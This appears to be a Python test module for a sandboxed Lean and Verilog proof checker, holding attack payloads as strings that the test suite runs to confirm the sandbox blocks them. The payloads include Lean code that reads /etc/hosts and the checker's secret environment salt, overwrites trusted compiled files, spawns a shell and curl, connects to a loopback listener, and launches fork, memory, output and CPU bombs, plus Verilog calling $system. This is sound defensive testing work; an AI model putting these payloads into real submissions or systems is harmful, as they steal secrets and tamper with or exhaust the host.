"""The Lean attacks of the sandbox (WP-S), as text: `tests/run.py`'s `sandbox` step appends each to the
`_example` reference proof and runs the result through `check.py --sandbox require`.

Every attack is a thing a submission's Lean file could do on 2026-10-31, when `check.py` ran it with the
checker's own privileges (measured, WP-S gate 0):

  NAIVE      the finding: `#eval` that reads /etc/hosts and writes a file outside the stage. Unsandboxed: ACCEPTED,
             the file exists. Sandboxed: the `#eval` throws, the file does not compile, REJECTED AT `solution`.
  CATCHING   the same family with every failure caught, so the file compiles whatever happens: ACCEPTED, and
             every `EXPLOIT <name>: BLOCKED` in the messages, no marker file, no connection at the listener.
             (A hostile file that catches its errors is accepted-but-neutralized: a denied call cannot be
             told from a permitted one by the checker.)
  MEMORY / OUTPUT / SPIN   resource bombs, stopped by the supervisor (SVGOLF_MEMORY / SVGOLF_OUTPUT in the
             message) or the task's wall-clock limit.
  ENV_SALT   (tests/run.py `host_env_salt`) the checker's secrets are invisible.
  SPAWN      (WP-BV) a file that starts copies of `lean` that start more. By default no process can be started (the
             Spec has no `fork`): the first spawn fails, nothing is left. GROUNDWORK (the dormant `bv_decide` support,
             forced on in tests/checker/check_bv_enabled.py: bv_decide is not supported, decided 2026-11-01): the
             granted `fork` lets the bomb run, and the supervisor's summed resident-memory limit stops it
             (SVGOLF_MEMORY), with no process of the bomb left.
  CADICAL    (WP-BV) the toolchain's solver, used BY HAND. By default nothing is granted, so every try, the legitimate
             one (`cadical` on a CNF in the temporary directory) included, is BLOCKED. GROUNDWORK (support forced
             on): the legitimate use is OK and every other `EXPLOIT <name>` BLOCKED: no proof written outside the
             temporary directory, no read of another directory's file, no shell. Unsandboxed (the control) the same
             file writes the marker.
"""

EXTRA_IMPORTS = "import Lean\nimport Std.Internal.UV.TCP\nimport Std.Internal.UV.System\nimport Std.Net.Addr\n"

NAIVE = """
/-! ===== WP-S attack `host_naive`: the 2026-10-31 finding ===== -/
#eval show IO Unit from do
  IO.println (← IO.FS.readFile "/etc/hosts")
  IO.FS.writeFile "@MARKER@" "pwned\\n"
"""

CATCHING = """
/-! ===== WP-S attack `host_catching`: every action is tried, every failure caught ===== -/
open Std.Internal.UV.TCP Std.Net in
def wpsTcp (port : UInt16) : IO String := do
  let s ← Socket.new
  let addr : SocketAddress := .v4 { addr := ⟨#v[127,0,0,1]⟩, port := port }
  let p ← s.connect addr
  match ← IO.wait p.result! with
  | .ok _ =>
    let q ← s.send #["WPS-TCP-HELLO".toUTF8]
    let _ ← IO.wait q.result!
    return "connected and sent"
  | .error e => throw e

def wpsTry (n : String) (a : IO String) : IO Unit := do
  try IO.println s!"EXPLOIT {n}: OK {← a}" catch e => IO.println s!"EXPLOIT {n}: BLOCKED {e}"

#eval wpsTry "read /etc/hosts" do return s!"{(← IO.FS.readFile "/etc/hosts").length} chars"
#eval wpsTry "list home" do return s!"{(← System.FilePath.readDir "@HOME@").size} entries"
#eval wpsTry "read another directory's file" do return (← IO.FS.readFile "@SECRET@").trimAscii.toString
#eval wpsTry "write outside" do IO.FS.writeFile "@MARKER@" "pwned\\n"; return "written"
#eval wpsTry "write into the stage" do IO.FS.writeFile "@STAGE@/Submission/evil.txt" "pwned\\n"; return "written"
#eval wpsTry "overwrite the trusted Design.olean" do
  let p ← Lean.findOLean `Submission.Design
  IO.FS.writeBinFile p "EVIL".toUTF8
  return s!"overwrote {p}"
#eval wpsTry "hard-link the trusted Design.olean" do
  let p ← Lean.findOLean `Submission.Design
  IO.FS.hardLink p (p.withExtension "olean.tmp.hl")
  return "linked"
#eval wpsTry "environment salt" do
  match ← IO.getEnv "SVGOLF_POSTSYNTH_SALT" with
  | some v => return s!"SALT {v}"
  | none => throw (IO.userError "unset")
#eval wpsTry "environment dump" do
  let e ← Std.Internal.UV.System.osEnviron
  return s!"{e.size} variables: {e.map (·.1)}"
#eval wpsTry "spawn a shell" do
  let o ← IO.Process.output { cmd := "/bin/sh", args := #["-c", "id -un"] }
  return s!"sh ran as {o.stdout.trimAscii}"
#eval wpsTry "tcp connect" (wpsTcp @PORT@)
"""

CADICAL = """
/-! ===== WP-BV attack `host_cadical`: the solver, started by hand ===== -/
def wpsCnf : String := "p cnf 1 2\n1 0\n-1 0\n"

def wpsCadical : IO System.FilePath := do
  return (← IO.appPath).parent.get! / "cadical"

def wpsTryC (n : String) (a : IO String) : IO Unit := do
  try IO.println s!"EXPLOIT {n}: OK {← a}" catch e => IO.println s!"EXPLOIT {n}: BLOCKED {e}"

/-! The legitimate use: a CNF in the temporary directory, the proof into the temporary directory. -/
#eval wpsTryC "cadical in the temporary directory" do
  let (h, cnf) ← IO.FS.createTempFile
  h.putStr wpsCnf
  h.flush
  let o ← IO.Process.output { cmd := (← wpsCadical).toString, args := #[cnf.toString, cnf.toString ++ ".lrat", "--lrat", "--quiet"] }
  if !o.stdout.contains 'U' then throw (IO.userError s!"no answer: exit {o.exitCode} {o.stderr.take 100}")
  return s!"solved (exit {o.exitCode})"

#eval wpsTryC "cadical writes its proof outside" do
  let (h, cnf) ← IO.FS.createTempFile
  h.putStr wpsCnf
  h.flush
  let _ ← IO.Process.output { cmd := (← wpsCadical).toString, args := #[cnf.toString, "@MARKER@", "--lrat", "--quiet"] }
  if !(← System.FilePath.pathExists "@MARKER@") then throw (IO.userError "no proof file was written there")
  return "wrote the marker"

#eval wpsTryC "cadical reads another directory's file" do
  let o ← IO.Process.output { cmd := (← wpsCadical).toString, args := #["@SECRETCNF@", "--quiet"] }
  if !o.stdout.contains 'U' then throw (IO.userError s!"could not read it: exit {o.exitCode} {o.stderr.take 100}")
  return "read the secret CNF"

-- with `fork` allowed a program that may not run is a CHILD whose exec failed: no exception, an exit status and no output
#eval wpsTryC "spawn a shell" do
  let o ← IO.Process.output { cmd := "/bin/sh", args := #["-c", "id -un"] }
  if o.exitCode != 0 || o.stdout.trimAscii.isEmpty then throw (IO.userError s!"did not run: exit {o.exitCode}")
  return s!"sh ran as {o.stdout.trimAscii}"

#eval wpsTryC "spawn curl" do
  let o ← IO.Process.output { cmd := "/usr/bin/curl", args := #["--version"] }
  if o.exitCode != 0 || o.stdout.trimAscii.isEmpty then throw (IO.userError s!"did not run: exit {o.exitCode}")
  return s!"curl ran: {o.stdout.take 20}"
"""

# The widening of WP-BV: with `fork` granted (and `lean` executable: it is the program itself), a file can start copies
# of `lean` that run a script it wrote into the temporary directory, and so on without end. The supervisor's summed
# resident-memory limit (a process group, polled) has to stop it, and nothing may be left running.
SPAWN = r"""
/-! ===== WP-BV attack `host_spawn_bomb`: copies of lean, each starting four more ===== -/
#eval show IO Unit from do
  let dir ← IO.FS.createTempDir
  let script := (dir / "bomb.lean").toString
  IO.FS.writeFile script ("partial def main : IO Unit := do\n  let me ← IO.appPath\n  for _ in [0:4] do\n    let _ ← IO.Process.spawn { cmd := me.toString, args := #[\"--run\", \"" ++ script ++ "\"] }\n  IO.sleep 120000\n")
  let me ← IO.appPath
  let _ ← IO.Process.spawn { cmd := me.toString, args := #["--run", script] }
  IO.sleep 120000
"""

MEMORY = """
/-! ===== WP-S attack `host_memory_bomb` ===== -/
#eval show IO Unit from do
  let r ← IO.mkRef (#[] : Array (Array Nat))
  for i in [0:100000] do
    r.modify (·.push (Array.replicate (25*1024*1024) i))
"""

OUTPUT = """
/-! ===== WP-S attack `host_output_flood`: straight to the checker's pipe, bypassing #eval's capture ===== -/
#eval show IO Unit from do
  let h ← IO.FS.Handle.mk "/dev/fd/1" .write
  let chunk := String.ofList (List.replicate 1048576 'A')
  for _ in [0:100000] do h.putStr chunk
"""

SPIN = """
/-! ===== WP-S attack `host_cpu_bomb` ===== -/
partial def wpsSpin (n : Nat) : Nat := wpsSpin (n + 1)
#eval wpsSpin 0
"""

# The hostile designs of the tool attacks (tests/sandbox/test_tools.py): they pass NO source gate, which is the
# point: the sandbox is the second layer under Yosys and Verilator.
YOSYS_READMEMH = """module t(input logic [3:0] a, output logic [31:0] y);
  logic [31:0] mem [0:1];
  initial $readmemh("@HEXFILE@", mem);
  assign y = mem[a[0]];
endmodule
"""

VERILATOR_SYSTEM = """module t(input logic [3:0] a, output logic [3:0] y);
  initial $system("echo pwned > @MARKER@");
  assign y = a;
endmodule
"""


class Listener:
    """A loopback TCP listener: the 'outside world' the network attacks try to reach. `.seen` is what arrived."""

    def __init__(self):
        import socket
        import threading
        self.sock = socket.socket()
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(8)
        self.sock.settimeout(0.5)
        self.port = self.sock.getsockname()[1]
        self.seen = []
        self._stop = False
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop:
            try:
                c, _ = self.sock.accept()
            except OSError:
                continue
            c.settimeout(1.0)
            try:
                self.seen.append(c.recv(100))
            except OSError:
                self.seen.append(b"")
            c.close()

    def close(self):
        self._stop = True
        self._thread.join(timeout=2)
        self.sock.close()


def fill(text, **kw):
    for k, v in kw.items():
        text = text.replace("@" + k.upper() + "@", str(v))
    return text
